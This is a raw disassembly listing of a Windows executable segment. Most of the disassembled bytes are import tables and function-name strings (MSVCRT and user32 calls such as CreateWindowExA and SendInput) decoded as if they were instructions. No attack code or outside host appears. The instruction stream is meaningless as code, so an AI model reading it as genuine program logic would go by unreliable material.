  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
